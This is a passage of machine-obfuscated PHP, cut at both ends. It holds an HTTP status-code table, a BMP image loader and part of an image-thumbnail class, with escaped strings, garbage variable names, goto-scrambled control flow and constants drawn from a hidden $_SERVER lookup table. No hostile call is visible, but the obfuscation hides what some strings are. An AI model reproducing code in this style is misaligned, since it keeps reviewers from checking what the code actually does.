"\105\x61\x72\x6c\171\x20\x48\151\x6e\164\163", "\62\60\x30" => "\117\113", "\62\x30\x31" => "\103\x72\145\x61\164\x65\x64", "\x32\60\x32" => "\101\143\x63\145\x70\164\145\144", "\x32\x30\63" => "\116\157\156\55\101\x75\164\x68\x6f\x72\151\x74\x61\164\151\x76\145\40\111\x6e\146\157\x72\x6d\141\164\151\x6f\156", "\x32\60\x34" => "\x4e\157\x20\x43\x6f\x6e\x74\145\x6e\x74", "\62\x30\65" => "\122\x65\163\145\164\40\x43\157\x6e\x74\145\x6e\x74", "\x32\x30\66" => "\x50\141\x72\x74\x69\141\154\40\103\157\156\x74\x65\156\164", "\62\x30\x37" => "\x4d\165\x6c\x74\151\55\123\164\141\x74\x75\x73", "\63\x30\60" => "\115\x75\x6c\164\151\160\154\x65\x20\103\x68\x6f\x69\x63\145\x73", "\x33\x30\x31" => "\x4d\x6f\166\145\x64\40\x50\145\162\155\141\156\145\x6e\164\154\x79", "\x33\60\62" => "\x46\x6f\x75\156\144", "\x33\x30\x33" => "\123\x65\x65\x20\117\164\x68\145\x72", "\63\60\64" => "\116\157\164\x20\x4d\x6f\144\x69\x66\x69\x65\144", "\63\60\x35" => "\x55\163\x65\40\x50\162\x6f\x78\171", "\x33\60\67" => "\124\x65\155\160\x6f\162\141\162\x79\40\122\145\144\151\x72\145\143\164", "\63\x30\x38" => "\120\145\162\x6d\141\x6e\145\x6e\x74\x20\x52\145\x64\x69\x72\x65\x63\164", "\x34\60\60" => "\x42\x61\144\x20\122\145\x71\x75\145\163\164", "\x34\60\x31" => "\125\x6e\141\x75\x74\x68\157\162\x69\172\145\x64", "\x34\x30\62" => "\x50\141\171\155\x65\156\164\40\122\x65\x71\x75\151\162\x65\x64", "\64\60\x33" => "\x46\x6f\162\142\151\x64\x64\145\156", "\x34\x30\x34" => "\116\x6f\x74\x20\106\x6f\x75\156\x64", "\64\x30\x35" => "\115\145\164\150\157\144\40\x4e\x6f\x74\x20\101\x6c\154\157\x77\x65\x64", "\64\x30\66" => "\x4e\x6f\x74\x20\101\x63\x63\x65\160\164\141\x62\x6c\145", "\64\60\x37" => "\x50\162\157\x78\x79\40\x41\x75\164\150\145\156\x74\151\143\x61\x74\151\157\156\x20\122\145\x71\165\x69\162\x65\x64", "\64\60\70" => "\x52\145\x71\165\x65\x73\164\x20\124\151\x6d\145\x6f\165\164", "\64\x30\x39" => "\103\x6f\156\x66\x6c\x69\x63\x74", "\64\x31\x30" => "\107\x6f\x6e\145", "\64\61\61" => "\114\x65\x6e\147\x74\150\40\122\x65\161\x75\151\162\x65\x64", "\64\61\62" => "\x50\x72\x65\143\157\156\144\x69\164\151\x6f\x6e\40\x46\x61\151\154\x65\144", "\64\61\63" => "\x52\x65\161\x75\145\x73\x74\x20\x45\x6e\164\151\164\x79\x20\x54\x6f\157\x20\114\141\162\x67\145", "\64\61\x34" => "\122\145\x71\x75\145\163\164\40\125\122\111\40\124\157\157\x20\114\x61\162\x67\x65", "\64\x31\x35" => "\125\x6e\x73\165\160\x70\157\162\164\145\x64\x20\x4d\145\144\151\141\x20\x54\171\x70\145", "\64\x31\x36" => "\122\145\161\x75\145\x73\x74\145\x64\40\x52\141\x6e\147\x65\x20\116\x6f\x74\x20\x53\141\164\151\x73\146\151\x61\142\x6c\145", "\x34\x31\67" => "\x45\x78\x70\x65\x63\x74\141\164\151\x6f\156\40\106\x61\x69\x6c\x65\144", "\64\x32\x32" => "\x55\156\160\162\x6f\x63\145\163\163\x61\x62\x6c\x65\40\105\x6e\164\151\164\x79", "\64\62\63" => "\x4c\x6f\x63\x6b\x65\x64", "\x34\x32\64" => "\106\141\151\x6c\x65\x64\40\x44\x65\x70\145\x6e\x64\145\x6e\x63\171", "\x34\x32\x35" => "\x55\x6e\157\162\x64\145\x72\145\x64\40\103\x6f\x6c\x6c\145\x63\x74\151\157\156", "\x34\62\x36" => "\125\x70\x67\162\141\144\x65\x20\122\x65\x71\165\x69\162\145\x64", "\64\x32\70" => "\120\x72\x65\x63\x6f\156\144\151\x74\151\157\x6e\x20\x52\145\x71\165\x69\x72\145\144", "\64\62\71" => "\x54\157\157\x20\115\141\156\171\x20\x52\145\161\x75\x65\x73\x74\x73", "\64\63\61" => "\122\x65\x71\x75\145\x73\x74\40\x48\145\x61\x64\145\x72\x20\106\151\145\x6c\x64\163\40\124\157\x6f\40\x4c\141\x72\147\x65", "\x34\x34\64" => "\116\x6f\x20\122\145\163\x70\157\156\x73\x65", "\64\65\60" => "\x42\154\x6f\x63\x6b\x65\x64\x20\142\171\x20\x57\151\156\144\x6f\x77\163\40\120\141\x72\145\156\x74\141\154\40\103\157\156\x74\162\157\154\x73", "\64\x35\61" => "\125\156\x61\166\x61\151\154\x61\142\x6c\145\40\106\157\162\x20\114\145\x67\141\154\40\x52\145\x61\163\x6f\x6e\163", "\64\x39\64" => "\x52\145\161\165\145\163\x74\40\110\x65\141\x64\145\x72\x20\x54\x6f\157\x20\114\141\162\147\145", "\x35\x30\60" => "\x49\x6e\x74\x65\162\156\141\x6c\x20\x53\x65\162\166\145\x72\x20\105\162\162\157\162", "\65\x30\61" => "\116\x6f\x74\x20\111\155\x70\x6c\145\155\145\156\164\145\144", "\65\60\x32" => "\102\141\144\x20\107\141\x74\x65\x77\x61\171", "\x35\60\63" => "\123\145\162\166\151\143\145\x20\125\x6e\141\x76\141\151\x6c\x61\142\x6c\x65", "\65\x30\64" => "\x47\141\164\145\167\141\171\40\124\x69\x6d\x65\157\x75\x74", "\65\60\65" => "\x48\124\124\x50\x20\x56\145\x72\x73\151\157\156\x20\x6e\x6f\164\40\163\165\160\x70\x6f\x72\x74\145\x64", "\65\60\x37" => "\111\x6e\163\x75\146\x66\151\x63\x69\x65\156\x74\x20\123\164\x6f\x72\x61\147\x65"); public static function code($B‡ÁºŠ‚®) { $f‡Ø§´¬ÖË =& $_SERVER[£ü]; $B‡ÁºŠ‚® = $B‡ÁºŠ‚® . $f‡Ø§´¬ÖË[33]; $e²ÀÄœ˜¶ = self::$statusCode[$B‡ÁºŠ‚®]; $e²ÀÄœ˜¶ = $e²ÀÄœ˜¶ ? "\110\x54\x54\120\x2f\61\x2e\x31\40{$B‡ÁºŠ‚®}\40" . $e²ÀÄœ˜¶ : $f‡Ø§´¬ÖË[33]; return $e²ÀÄœ˜¶; } } class ImageGdBMP { public static function load($eÄñâ´öˆæ) { $A…Øò©Üä¤ = fopen($eÄñâ´öˆæ, $_SERVER[£ü][1480]); if ($A…Øò©Üä¤ === !1) { return !1; } $f¬İ’˜ÌíŸ = self::loadFromStream($A…Øò©Üä¤); fclose($A…Øò©Üä¤); return $f¬İ’˜ÌíŸ; } public static function loadFromStream($b˜†Œ·»™Ô) { $cíøŠ¢œ¶ó =& $_SERVER[£ü]; $eË®ËŞ“… = fread($b˜†Œ·»™Ô, 14); if ($eË®ËŞ“… === !1) { return !1; } if ($eË®ËŞ“…[0] != $cíøŠ¢œ¶ó[1792] || $eË®ËŞ“…[1] != $cíøŠ¢œ¶ó[1793]) { return !1; } $BÀë´—ƒŠŒ = unpack($cíøŠ¢œ¶ó[1794] . $cíøŠ¢œ¶ó[1795] . $cíøŠ¢œ¶ó[1796] . $cíøŠ¢œ¶ó[1797] . $cíøŠ¢œ¶ó[1798], $eË®ËŞ“…); return self::loadFromStreamAndFileHeader($b˜†Œ·»™Ô, $BÀë´—ƒŠŒ); } public static function loadFromStreamAndFileHeader($F«³Š¨Ğò, array $fğ®³ †‚¿) { goto a°Ãô«¬¤ñ; CˆÕ¡ÒĞÌ¨: $c‰”åÆí¨Ç = abs($B‰²²ÊÂ‚í); $Cİ¹øÊÍ˜Ê = $B‰²²ÊÂ‚í > 0 ? $c‰”åÆí¨Ç - 1 : 0; $Aù Ç†º = $B‰²²ÊÂ‚í > 0 ? -1 : 1; goto e„Î¹¤·Î; a°Ãô«¬¤ñ: $A‡˜Ê¦•—ì =& $_SERVER[£ü]; if ($fğ®³ †‚¿[$A‡˜Ê¦•—ì[385]] != 19778) { return !1; } $aÄœÑÊãï = fread($F«³Š¨Ğò, 4); goto Cë•œö³“¢; Eêçî²ß©ñ: if ($a øÆ•İ‘Ê == 0 || $B‰²²ÊÂ‚í == 0 || $FŒ¬©½æì != 1 || ($AÀ¯µ‚ «‘ & $CÖóÁÑâ’‚) != 0 || ($AÀ¯µ‚ «‘ & $EÜµã¦Ãİ) != 0 || ($AÀ¯µ‚ «‘ & $c¤ªÓâäô¬) != 0 || ($CÖóÁÑâ’‚ & $EÜµã¦Ãİ) != 0 || ($CÖóÁÑâ’‚ & $c¤ªÓâäô¬) != 0 || ($EÜµã¦Ãİ & $c¤ªÓâäô¬) != 0) { return !1; } if ($B¢³¡áÖŞ == 4 || $B¢³¡áÖŞ == 5) { $aÄœÑÊãï = stream_get_contents($F«³Š¨Ğò, $fÁöíÀ˜”); if ($aÄœÑÊãï === !1) { return !1; } return imagecreatefromstring($aÄœÑÊãï); } $c±É¤ø…Œö = $a øÆ•İ‘Ê * $B™Œ‰Û§’ + 31 >> 3 & ~3; goto CˆÕ¡ÒĞÌ¨; Cë•œö³“¢: if ($aÄœÑÊãï === !1) { return !1; } list(, $fĞÎ§¡º™©) = unpack($A‡˜Ê¦•—ì[1799], $aÄœÑÊãï); if ($fĞÎ§¡º™© == 12) { goto Bå¦ƒˆç; cÙÖÌ©Íä°: $c¤ªÓâäô¬ = 255; goto CÉÔêŸËİ; Bå¦ƒˆç: $aÄœÑÊãï = fread($F«³Š¨Ğò, $fĞÎ§¡º™© - 4); if ($aÄœÑÊãï === !1) { return !1; } extract(unpack($A‡˜Ê¦•—ì[1800] . $A‡˜Ê¦•—ì[1801] . $A‡˜Ê¦•—ì[1802] . $A‡˜Ê¦•—ì[1803], $aÄœÑÊãï)); goto e¨ÉóÇÜÕë; e¨ÉóÇÜÕë: $aëŞ‘…÷áÖ = $Cì¾…’˜Š = $AÀ¯µ‚ «‘ = $B¢³¡áÖŞ = 0; $CÖóÁÑâ’‚ = 16711680; $EÜµã¦Ãİ = 65280; goto cÙÖÌ©Íä°; CÉÔêŸËİ: } else { if (124 < $fĞÎ§¡º™© || $fĞÎ§¡º™© < 40) { return !1; } else { goto BëØ§‰îÁ´; F˜Áãë¢½Å: if (($B™Œ‰Û§’ == 16 || $B™Œ‰Û§’ == 24 || $B™Œ‰Û§’ == 32) && $B¢³¡áÖŞ == 0 && $CÖóÁÑâ’‚ == 0 && $EÜµã¦Ãİ == 0 && $c¤ªÓâäô¬ == 0) { switch ($B™Œ‰Û§’) { case 16: $CÖóÁÑâ’‚ = 31744; $EÜµã¦Ãİ = 992; $c¤ªÓâäô¬ = 31; break; case 24: case 32: $CÖóÁÑâ’‚ = 16711680; $EÜµã¦Ãİ = 65280; $c¤ªÓâäô¬ = 255; break; } } goto cİé¯¼éÃ; b‹„¬µ†òí: if ($Cë¦ÉÌ¦‰– & 2147483648) { $Cë¦ÉÌ¦‰– = -(~$Cë¦ÉÌ¦‰– & 4294967295) - 1; } if ($fğ®³ †‚¿[$A‡˜Ê¦•—ì[516]] != 0) { $CÆ„”Ììé° = $B™Œ‰Û§’ == 1 || $B™Œ‰Û§’ == 4 || $B™Œ‰Û§’ == 8 ? ($aëŞ‘…÷áÖ ? $aëŞ‘…÷áÖ : pow(2, $B™Œ‰Û§’)) << 2 : 0; $d˜ä‘ğ“İ = $fÁöíÀ˜” ? $fÁöíÀ˜” : ($a øÆ•İ‘Ê * $B™Œ‰Û§’ + 31 >> 3 & ~3) * abs($B‰²²ÊÂ‚í); $Cë…õğ—õñ = $fğ®³ †‚¿[$A‡˜Ê¦•—ì[516]] - $d˜ä‘ğ“İ - $CÆ„”Ììé° - 14; if ($fĞÎ§¡º™© < $Cë…õğ—õñ && 40 <= $fĞÎ§¡º™© && $fĞÎ§¡º™© <= 124) { $fĞÎ§¡º™© = $Cë…õğ—õñ; } } if ($fĞÎ§¡º™© - 40 > 0) { $aÄœÑÊãï = fread($F«³Š¨Ğò, $fĞÎ§¡º™© - 40); if ($aÄœÑÊãï === !1) { return !1; } extract(unpack($A‡˜Ê¦•—ì[1813] . $A‡˜Ê¦•—ì[1814] . $A‡˜Ê¦•—ì[1815] . $A‡˜Ê¦•—ì[1816], $aÄœÑÊãï . str_repeat($A‡˜Ê¦•—ì[1817], 120))); } else { $AÀ¯µ‚ «‘ = $CÖóÁÑâ’‚ = $EÜµã¦Ãİ = $c¤ªÓâäô¬ = 0; } goto F˜Áãë¢½Å; B¶™ê‰Ş™Ó: if ($a øÆ•İ‘Ê & 2147483648) { $a øÆ•İ‘Ê = -(~$a øÆ•İ‘Ê & 4294967295) - 1; } if ($B‰²²ÊÂ‚í & 2147483648) { $B‰²²ÊÂ‚í = -(~$B‰²²ÊÂ‚í & 4294967295) - 1; } if ($B­ÀäÃ† & 2147483648) { $B­ÀäÃ† = -(~$B­ÀäÃ† & 4294967295) - 1; } goto b‹„¬µ†òí; BëØ§‰îÁ´: $aÄœÑÊãï = fread($F«³Š¨Ğò, 36); if ($aÄœÑÊãï === !1) { return !1; } extract(unpack($A‡˜Ê¦•—ì[1804] . $A‡˜Ê¦•—ì[1805] . $A‡˜Ê¦•—ì[1802] . $A‡˜Ê¦•—ì[1806] . $A‡˜Ê¦•—ì[1807] . $A‡˜Ê¦•—ì[1808] . $A‡˜Ê¦•—ì[1809] . $A‡˜Ê¦•—ì[1810] . $A‡˜Ê¦•—ì[1811] . $A‡˜Ê¦•—ì[1812], $aÄœÑÊãï)); goto B¶™ê‰Ş™Ó; cİé¯¼éÃ: } } goto Eêçî²ß©ñ; e„Î¹¤·Î: if ($B™Œ‰Û§’ == 1 || $B™Œ‰Û§’ == 4 || $B™Œ‰Û§’ == 8) { goto CÅ‚–³˜¹‚; CÅ‚–³˜¹‚: $a™Í½‡Ë¤¨ = imagecreate($a øÆ•İ‘Ê, $c‰”åÆí¨Ç); $Eä”±ï«’ = $fĞÎ§¡º™© == 12 ? 3 : 4; $fÅœöÊÌãâ = $aëŞ‘…÷áÖ ? $aëŞ‘…÷áÖ : pow(2, $B™Œ‰Û§’); goto C…ØŸ³êœÑ; DÌª…í±šÜ: $a¿ÁÂï…·Ø = (1 << $B™Œ‰Û§’) - 1 << $DíÀÓİ„¦¡; if ($B¢³¡áÖŞ == 1 || $B¢³¡áÖŞ == 2) { $dù’Èë»ˆ = 0; $b¡šÌ¹©³Â = $B™Œ‰Û§’ >> 2 & 1; for (;;) { if ($dù’Èë»ˆ < -1 || $dù’Èë»ˆ > $a øÆ•İ‘Ê || $Cİ¹øÊÍ˜Ê < -1 || $Cİ¹øÊÍ˜Ê > $B‰²²ÊÂ‚í) { imagedestroy($a™Í½‡Ë¤¨); return !1; } $aÄœÑÊãï = fread($F«³Š¨Ğò, 1); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } switch ($aÄœÑÊãï) { case $A‡˜Ê¦•—ì[1817]: $aÄœÑÊãï = fread($F«³Š¨Ğò, 1); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } switch ($aÄœÑÊãï) { case $A‡˜Ê¦•—ì[1817]: $Cİ¹øÊÍ˜Ê += $Aù Ç†º; $dù’Èë»ˆ = 0; break; case $A‡˜Ê¦•—ì[1819]: $Cİ¹øÊÍ˜Ê = 0; $dù’Èë»ˆ = 0; break 3; case $A‡˜Ê¦•—ì[1820]: $aÄœÑÊãï = fread($F«³Š¨Ğò, 2); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } list(, $CµÚÉÄ —, $e§¬áÅÌ¿·) = unpack($A‡˜Ê¦•—ì[1821], $aÄœÑÊãï); $dù’Èë»ˆ += $CµÚÉÄ —; $Cİ¹øÊÍ˜Ê += $e§¬áÅÌ¿· * $Aù Ç†º; break; default: list(, $eöàİÕæ…³) = unpack($A‡˜Ê¦•—ì[1822], $aÄœÑÊãï); $cÌ‹Šè¨ = ($eöàİÕæ…³ >> $b¡šÌ¹©³Â) + ($eöàİÕæ…³ & $b¡šÌ¹©³Â); $aÄœÑÊãï = fread($F«³Š¨Ğò, $cÌ‹Šè¨ + 1 & ~1); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } for ($c®ï ÙİÛ¤ = 0, $EÎõ“óŠŞê = 0; $c®ï ÙİÛ¤ < $eöàİÕæ…³; ++$c®ï ÙİÛ¤, ++$dù’Èë»ˆ, $EÎõ“óŠŞê += $B™Œ‰Û§’) { list(, $bÃ­ø‡§éÄ) = unpack($A‡˜Ê¦•—ì[1822], $aÄœÑÊãï[$EÎõ“óŠŞê >> 3]); $fğÀ°¿•®Ú = $EÎõ“óŠŞê & 7; imagesetpixel($a™Í½‡Ë¤¨, $dù’Èë»ˆ, $Cİ¹øÊÍ˜Ê, $Bï¿Ïã‡÷è[($bÃ­ø‡§éÄ & $a¿ÁÂï…·Ø >> $fğÀ°¿•®Ú) >> $DíÀÓİ„¦¡ - $fğÀ°¿•®Ú]); } break; } break; default: $Fë—É´Šá = fread($F«³Š¨Ğò, 1); if ($Fë—É´Šá === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } list(, $AŒä§Øˆ‚…, $bÃ­ø‡§éÄ) = unpack($A‡˜Ê¦•—ì[1821], $aÄœÑÊãï . $Fë—É´Šá); for ($c®ï ÙİÛ¤ = 0, $EÎõ“óŠŞê = 0; $c®ï ÙİÛ¤ < $AŒä§Øˆ‚…; ++$c®ï ÙİÛ¤, ++$dù’Èë»ˆ, $EÎõ“óŠŞê += $B™Œ‰Û§’) { $fğÀ°¿•®Ú = $EÎõ“óŠŞê & 7; imagesetpixel($a™Í½‡Ë¤¨, $dù’Èë»ˆ, $Cİ¹øÊÍ˜Ê, $Bï¿Ïã‡÷è[($bÃ­ø‡§éÄ & $a¿ÁÂï…·Ø >> $fğÀ°¿•®Ú) >> $DíÀÓİ„¦¡ - $fğÀ°¿•®Ú]); } break; } } } else { for ($b…Íç¢¾™ƒ = 0; $b…Íç¢¾™ƒ < $c‰”åÆí¨Ç; ++$b…Íç¢¾™ƒ, $Cİ¹øÊÍ˜Ê += $Aù Ç†º) { $aÄœÑÊãï = fread($F«³Š¨Ğò, $c±É¤ø…Œö); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } $EÎõ“óŠŞê = 0; for ($dù’Èë»ˆ = 0; $dù’Èë»ˆ < $a øÆ•İ‘Ê; ++$dù’Èë»ˆ, $EÎõ“óŠŞê += $B™Œ‰Û§’) { list(, $bÃ­ø‡§éÄ) = unpack($A‡˜Ê¦•—ì[1822], $aÄœÑÊãï[$EÎõ“óŠŞê >> 3]); $fğÀ°¿•®Ú = $EÎõ“óŠŞê & 7; imagesetpixel($a™Í½‡Ë¤¨, $dù’Èë»ˆ, $Cİ¹øÊÍ˜Ê, $Bï¿Ïã‡÷è[($bÃ­ø‡§éÄ & $a¿ÁÂï…·Ø >> $fğÀ°¿•®Ú) >> $DíÀÓİ„¦¡ - $fğÀ°¿•®Ú]); } } } goto cÅêœåì‹­; C…ØŸ³êœÑ: $Bï¿Ïã‡÷è = array(); for ($c®ï ÙİÛ¤ = 0; $c®ï ÙİÛ¤ < $fÅœöÊÌãâ; ++$c®ï ÙİÛ¤) { $aÄœÑÊãï = fread($F«³Š¨Ğò, $Eä”±ï«’); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } extract(unpack($A‡˜Ê¦•—ì[1818], $aÄœÑÊãï . $A‡˜Ê¦•—ì[1817])); $Bï¿Ïã‡÷è[] = imagecolorallocate($a™Í½‡Ë¤¨, $dåç©÷‰°, $d½Š•Ü·«, $fğÀ°¿•®Ú); } $DíÀÓİ„¦¡ = 8 - $B™Œ‰Û§’; goto DÌª…í±šÜ; cÅêœåì‹­: } else { goto e¼ £×´; aĞÜ†¨³õÃ: for ($b…Íç¢¾™ƒ = 0; $b…Íç¢¾™ƒ < $c‰”åÆí¨Ç; ++$b…Íç¢¾™ƒ, $Cİ¹øÊÍ˜Ê += $Aù Ç†º) { $aÄœÑÊãï = fread($F«³Š¨Ğò, $c±É¤ø…Œö); if ($aÄœÑÊãï === !1) { imagedestroy($a™Í½‡Ë¤¨); return !1; } $EÎõ“óŠŞê = 0; for ($dù’Èë»ˆ = 0; $dù’Èë»ˆ < $a øÆ•İ‘Ê; ++$dù’Èë»ˆ, $EÎõ“óŠŞê += $A²½¹¯©Ä‡) { list(, $bÃ­ø‡§éÄ) = unpack($A‡˜Ê¦•—ì[1799], substr($aÄœÑÊãï, $EÎõ“óŠŞê, $A²½¹¯©Ä‡) . $A‡˜Ê¦•—ì[1823]); $eó˜´æ†­‰ = $bÃ­ø‡§éÄ & $AÀ¯µ‚ «‘; $B¦Âİ´ñİ = $bÃ­ø‡§éÄ & $CÖóÁÑâ’‚; $CËˆ¿º¦åç = $bÃ­ø‡§éÄ & $EÜµã¦Ãİ; $EæÅ·í¾– = $bÃ­ø‡§éÄ & $c¤ªÓâäô¬; $EÜ‚Æ·Œñø = $d™®¿ó‹ç - (($eó˜´æ†­‰ << 7) - $eó˜´æ†­‰) * $dæÏ¡¿Â†Ñ; $dåç©÷‰° = (($B¦Âİ´ñİ << 8) - $B¦Âİ´ñİ) * $E§‰‹ƒ½‰; $d½Š•Ü·« = (($CËˆ¿º¦åç << 8) - $CËˆ¿º¦åç) * $f‹Œòè¦©»; $fğÀ°¿•®Ú = (($EæÅ·í¾– << 8) - $EæÅ·í¾–) * $dŠ¶÷Æµì“; imagesetpixel($a™Í½‡Ë¤¨, $dù’Èë»ˆ, $Cİ¹øÊÍ˜Ê, $EÜ‚Æ·Œñø << 24 | $dåç©÷‰° << 16 | $d½Š•Ü·« << 8 | $fğÀ°¿•®Ú); } } imagealphablending($a™Í½‡Ë¤¨, !0); goto fÂ…³ğÄ•; fäîŒ×Òââ: $E§‰‹ƒ½‰ = $CÖóÁÑâ’‚ ? 1 / $CÖóÁÑâ’‚ : 1; $f‹Œòè¦©» = $EÜµã¦Ãİ ? 1 / $EÜµã¦Ãİ : 1; $dŠ¶÷Æµì“ = $c¤ªÓâäô¬ ? 1 / $c¤ªÓâäô¬ : 1; goto aĞÜ†¨³õÃ; bÇã¬Ù‘Ûà: $A²½¹¯©Ä‡ = $B™Œ‰Û§’ >> 3; $d™®¿ó‹ç = $AÀ¯µ‚ «‘ ? 127 : 0; $dæÏ¡¿Â†Ñ = $AÀ¯µ‚ «‘ ? 1 / $AÀ¯µ‚ «‘ : 1; goto fäîŒ×Òââ; e¼ £×´: $a™Í½‡Ë¤¨ = imagecreatetruecolor($a øÆ•İ‘Ê, $c‰”åÆí¨Ç); imagealphablending($a™Í½‡Ë¤¨, !1); if ($AÀ¯µ‚ «‘) { imagesavealpha($a™Í½‡Ë¤¨, !0); } goto bÇã¬Ù‘Ûà; fÂ…³ğÄ•: } return $a™Í½‡Ë¤¨; goto E‘‡…’’è·; E‘‡…’’è·: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($AÆ•Û˜ñÏ, $d‡ÆäŞê¾) { goto EØä“ë¥æˆ; DùïŒ®µí: if (!$this->im) { return !1; } $bÒ”÷ë»™ = $_SERVER[£ü][33]; $this->imgData = GetImageSize($AÆ•Û˜ñÏ, $bÒ”÷ë»™); goto EâãŠëóƒ; EâãŠëóƒ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Câò¶Ö“Òë; EØä“ë¥æˆ: $this->srcFile = $AÆ•Û˜ñÏ; $this->echoType = $d‡ÆäŞê¾; $this->im = self::image($AÆ•Û˜ñÏ); goto DùïŒ®µí; Câò¶Ö“Òë: } public static function image($c¸ôÀ¬œ³©) { $c·¼¢Ø«ŒÖ =& $_SERVER[£ü]; $Bî¦ç§‰ò¹ = $c·¼¢Ø«ŒÖ[33]; $B†Ú¸îÓ§¥ = GetImageSize($c¸ôÀ¬œ³©, $Bî¦ç§‰ò¹); $Fá«Â±éÙ• = !1; switch ($B†Ú¸îÓ§¥[2]) { case IMAGETYPE_GIF: if (!function_exists($c·¼¢Ø«ŒÖ[1824])) { break; } $Fá«Â±éÙ• = imagecreatefromgif($c¸ôÀ¬œ³©); break; case IMAGETYPE_JPEG: if (!function_exists($c·¼¢Ø«ŒÖ[1825])) { break; } $Fá«Â±éÙ• = imagecreatefromjpeg($c¸ôÀ¬œ³©); break; case IMAGETYPE_PNG: if (!function_exists($c·¼¢Ø«ŒÖ[1826])) { break; } $Fá«Â±éÙ• = @imagecreatefrompng($c¸ôÀ¬œ³©); imagesavealpha($Fá«Â±éÙ•, !0); break; case IMAGETYPE_XBM: $Fá«Â±éÙ• = imagecreatefromxbm($c¸ôÀ¬œ³©); break; case IMAGETYPE_WBMP: $Fá«Â±éÙ• = imagecreatefromwbmp($c¸ôÀ¬œ³©); break; case IMAGETYPE_BMP: $Fá«Â±éÙ• = imagecreatefrombmp($c¸ôÀ¬œ³©); break; default: break; } return $Fá«Â±éÙ•; } public static function imageSize($Eôë¢‹šÜ) { $BãÑƒ´©Ò¿ =& $_SERVER[£ü]; $ašà›ªÕ¯´ = GetImageSize($Eôë¢‹šÜ); if (!$ašà›ªÕ¯´) { return !1; } return array($BãÑƒ´©Ò¿[1827] => $ašà›ªÕ¯´[0], $BãÑƒ´©Ò¿[1828] => $ašà›ªÕ¯´[1]); } function distortion($B¾öŠ‚ëî, $F‚¬…œß½Ê, $c°šˆ Ô») { $eğ®É‘á“ä = $this->creatImage($this->im, $F‚¬…œß½Ê, $c°šˆ Ô», 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eğ®É‘á“ä, $B¾öŠ‚ëî); } function prorate($Dø­ªìÙĞ, $DÛ»Ÿ‘Ô³µ, $F÷òŠáì±™) { $B”Â‘ó³¥Æ = $DÛ»Ÿ‘Ô³µ / $F÷òŠáì±™; $C‡’¦ç‰ß™ = $this->srcW / $this->srcH; if ($B”Â‘ó³¥Æ <= $C‡’¦ç‰ß™) { $eİÌ›‚®É = $DÛ»Ÿ‘Ô³µ; $fôø·Ô„¹ç = $eİÌ›‚®É * ($this->srcH / $this->srcW); } else { $fôø·Ô„¹ç = $F÷òŠáì±™; $eİÌ›‚®É = $fôø·Ô„¹ç * ($this->srcW / $this->srcH); } if ($this->srcW > $DÛ»Ÿ‘Ô³µ || $this->srcH > $F÷òŠáì±™) { $BÎÚºøòğà = $this->creatImage($this->im, $eİÌ›‚®É, $fôø·Ô„¹ç, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($BÎÚºøòğà, $Dø­ªìÙĞ); } else { $BÎÚºøòğà = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($BÎÚºøòğà, $Dø­ªìÙĞ); } } function cut($d³„Ì˜—Àª, $DÔ¼¥ùõª˜, $b¶ÏçÔí¾å) { goto bÔáÙ †Ó; DÖø–°ÇÄµ: $f„ÊõË…î„ = $this->creatImage($this->im, $BØŒÎò‚¡, $Cß‚®ÃÎ¥”, 0, 0, 0, 0, $this->srcW, $this->srcH); $e»ª‰º¦ = $this->creatImage($f„ÊõË…î„, $DÔ¼¥ùõª˜, $b¶ÏçÔí¾å, 0, 0, ($BØŒÎò‚¡ - $DÔ¼¥ùõª˜) / 2, ($Cß‚®ÃÎ¥” - $b¶ÏçÔí¾å) / 2, $DÔ¼¥ùõª˜, $b¶ÏçÔí¾å); imageDestroy($f„ÊõË…î„); goto c­êµª’Ù; bÔáÙ †Ó: $bŠØ›Ëœµ = $DÔ¼¥ùõª˜ / $b¶ÏçÔí¾å; $E¹ç‰À­Ò† = $this->srcW / $this->srcH; if ($bŠØ›Ëœµ <= $E¹ç‰À­Ò†) { $Cß‚®ÃÎ¥” = $b¶ÏçÔí¾å; $BØŒÎò‚¡ = $Cß‚®ÃÎ¥” * ($this->srcW / $this->srcH); } else { $BØŒÎò‚¡ = $DÔ¼¥ùõª˜; $Cß‚®ÃÎ¥” = $BØŒÎò‚¡ * ($this->srcH / $this->srcW); } goto DÖø–°ÇÄµ; c­êµª’Ù: return $this->echoImage($e»ª‰º¦, $d³„Ì˜—Àª); goto AÂô»«È¯â; AÂô»«È¯â: } function backFill($AˆæØ¿’ŸÈ, $E­Çìç²Ÿ², $C‹¼ò‘ÂÑ¤, $bÃÅµâ = false, $c‘â ¹†‡ã = 255, $E¥³‹Üƒ· = 255, $EÌ†ª—Èå = 255) { goto A…Ø¸©«‚ö; E¹¦½š¾æÑ: if (function_exists($_SERVER[£ü][1829])) { @($D˜—Š«ë‚Ù = imageCreateTrueColor($E­Çìç²Ÿ², $C‹¼ò‘ÂÑ¤)); if (!$D˜—Š«ë‚Ù) { $D˜—Š«ë‚Ù = imageCreate($E­Çìç²Ÿ², $C‹¼ò‘ÂÑ¤); } } else { $D˜—Š«ë‚Ù = imageCreate($E­Çìç²Ÿ², $C‹¼ò‘ÂÑ¤); } $E†‚²®§„ = ($C‹¼ò‘ÂÑ¤ - $EÏİ„œäãÓ) / 2; $aö‘†ŸÚœ’ = imagecolorallocate($D˜—Š«ë‚Ù, $c‘â ¹†‡ã, $E¥³‹Üƒ·, $EÌ†ª—Èå); goto fïÇ² ƒ‘; A…Ø¸©«‚ö: $b·õØê¥§× = $E­Çìç²Ÿ² / $C‹¼ò‘ÂÑ¤; $eñ±ŸÎ¢ÑÌ = $this->srcW / $this->srcH; if ($b·õØê¥§× <= $eñ±ŸÎ¢ÑÌ) { $Cò¥‡ë¥— = $E­Çìç²Ÿ²; $EÏİ„œäãÓ = $Cò¥‡ë¥— * 